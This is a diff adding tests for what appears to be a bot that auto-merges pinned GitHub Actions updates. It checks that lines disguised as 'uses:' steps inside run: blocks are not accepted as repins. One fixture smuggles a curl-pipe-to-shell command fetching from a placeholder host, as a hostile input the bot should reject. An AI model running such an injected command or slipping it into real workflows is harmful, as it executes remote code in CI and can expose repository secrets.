@@ -549,6 +549,32 @@ status = bump("")  # the diff couldn't be read
 assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
 status = bump(PIN, ".github/CODEOWNERS")
 assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
+# A repin replaces each `uses:` line in place: a step dropped for a
+# `uses:`-shaped line in a `run:` block isn't one, whatever its ref says.
+RUN_HEAD = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -5,4 +5,4 @@
+-      - uses: actions/checkout@1111111111111111111111111111111111111111 # v4.1.0
+       - run: |
+           make
+"""
+for diff in (RUN_HEAD + "+          uses: actions/checkout@2222222222222222222222222222222222222222||true;curl${IFS}https://example.invalid|sh\n",
+             RUN_HEAD + "+          uses: actions/checkout@2222222222222222222222222222222222222222\n",
+             PIN.replace("+      - uses:", "+        uses:")):
+    status = bump(diff)
+    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (diff, status, WROTE)
+# Several steps repinned together are each replaced in place, and merge.
+status = bump("""diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -5,2 +5,2 @@
+-      - uses: actions/checkout@1111111111111111111111111111111111111111 # v4.1.0
+-      - uses: actions/setup-node@3333333333333333333333333333333333333333 # v4.0.0
++      - uses: actions/checkout@2222222222222222222222222222222222222222 # v4.2.0
++      - uses: actions/setup-node@4444444444444444444444444444444444444444 # v4.1.0
+""")
+assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
 # The file list names only a rename's new path: a rename out of .github/ or
 # a dormant workflow renamed in is read from the diff, and so is a workflow
 # whose mode alone changed; none of them is a repin.
